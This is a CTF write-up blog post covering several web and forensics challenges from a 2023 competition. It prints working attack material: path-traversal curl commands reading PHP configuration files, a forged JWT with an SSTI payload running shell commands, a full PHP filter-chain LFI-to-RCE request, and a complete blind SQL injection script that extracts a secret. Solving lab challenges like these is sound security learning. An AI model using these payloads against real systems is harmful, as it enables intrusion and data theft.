---
layout: post
title: "[CTF] GCCG Writeup"
date: 2023-12-03 +0800
categories: CTF
hidden: false
---

## Space game

![](/images/2023/12/NGqkYHQ.png)



## UGUARD

 - [https://unix.stackexchange.com/questions/15473/what-is-the-difference-between-etc-and-usr-local-etc](https://unix.stackexchange.com/questions/15473/what-is-the-difference-between-etc-and-usr-local-etc)
 - [https://www.mxp.tw/6576/#google_vignette](https://www.mxp.tw/6576/#google_vignette)

```bash
curl http://10.99.111.108:1995/img.php?img=$(printf ..../..../..../..../..../..../..../..../..../usr/local//etc/php/php.ini | base64 -w 0)
```

```bash
curl http://10.99.111.108:1995/img.php?img=$(printf ..../..../..../..../..../..../..../..../..../usr/local/lib/php/extensions/no-debug-non-zts-20220829/uguard.so | base64 -w 0)
```



## bossti
- JWT + SSTI
- JWT
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYm9zcyIsImhhY2siOiIxIn0.I3Y1_hvlr07xOmOyZK8vVjzxEfdxtnPfm7lT9TGgxps
```
![](/images/2023/12/PuvWEtY.png)

- SSTI
```
http://10.99.111.109:5000/boss?data=%7B%27user_id%27%3A+1,+%27role%27%3A+%27boss%27,+%27hack%27%3A+%27%7B%7Bnamespace.__init__.__globals__.os.popen("cat Flag.txt").read()%7D%7D%27%7D
```

![](/images/2023/12/4Bg8ADV.png)

## babyLFI

- result

![](/images/2023/12/SlcFlxn.png)

- 繞過preg_match

- create php filter chain
```python
python3 php_filter_chain_generator.py --chain  '<?php system("cat /flag*"); ?>'
```

- payload

```
POST /index.php? HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 1006074

filename#=php://filter/(a*1000000)/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```


## Flag Slot Machine

 - 有SQLI，是boolean要用二分法

    ![](/images/2023/12/RgiSuBB.png)

 - 每3分鐘會reset key

    ![](/images/2023/12/PUEROH3.png)

```python
import requests_go
import requests
url = "https://127.0.0.1:8787/login.php"
headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
}
tls = requests_go.tls_config.TLSConfig()
tls.ja3 = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0"

aa = "0123456789abcdefgh"
bb = "ijklmnopqrstuvwxyz"
payload = "kaibro' and (select secret from secret_db.s3cret_table where secret LIKE '0%')  -- -"
ans  = ""
tmp = ""
test=0
for i in range(32):
    payloadsss = "kaibro' and (select substr(secret," +  str(i) + ",1)>104 from secret_db.s3cret_table)  -- -"
    body= {"user":payloadsss,"pwd":"asd"}
    response = requests_go.post(url=url, headers=headers, tls_config=tls,data=body)
    if ("successful" in response.text):
        for i in bb :
            tmp = ans +i
            payloadsss = "kaibro' and (select secret from secret_db.s3cret_table where secret LIKE '" + tmp + "%')  -- -"
            body= {"user":payloadsss,"pwd":"asd"}
            response = requests_go.post(url=url, headers=headers, tls_config=tls,data=body)
            print(payloadsss)
            if ("successful" in response.text):
                ans = ans +i
                print(payloadsss , "___now ans___",len(ans))
    else:
        for i in aa:
            tmp = ans +i
            payloadsss = "kaibro' and (select secret from secret_db.s3cret_table where secret LIKE '" + tmp + "%')  -- -"
            body= {"user":payloadsss,"pwd":"asd"}
            response = requests_go.post(url=url, headers=headers, tls_config=tls,data=body)
            print(payloadsss)
            if ("successful" in response.text):
                ans = ans +i
                print(payloadsss , "___now ans___",len(ans))
    if(len(ans)==32):

        print(ans)
        anssssss = "https://127.0.0.1:8787/flag.php?secret="
        lasturl = anssssss + ans
        response= requests.get(url=lasturl, headers=headers, verify=False)
        print(response.text)    
        exit()

```

![](/images/2023/12/AHqMcBu.png)


## Link list

 - 好工具 (JumpList Explorer,LECmd) [https://ericzimmerman.github.io/#!index.md](https://ericzimmerman.github.io/#!index.md)

### first
- ink long name

![](/images/2023/12/72pFOrZ.png)

### second
```LECmd.exe -d ../aa/ --all > test.txt```
- ink short name

![](/images/2023/12/xTBxmYc.png)

### third


![](/images/2023/12/l2MkjFS.png)


![](/images/2023/12/7pEJDAP.png)

### last
 - 直接string

![](/images/2023/12/XnqoBGT.png)



### 組合起來
CGGC{3z_f1r57_qu4r73r_57ruc7ur3s_f0r_53c0nd_m4l1c10u5_7h1rd_0n3_l457_p4r7_15_h1dd3n!}

## Result

![](/images/2023/12/yUZ1QOs.png)
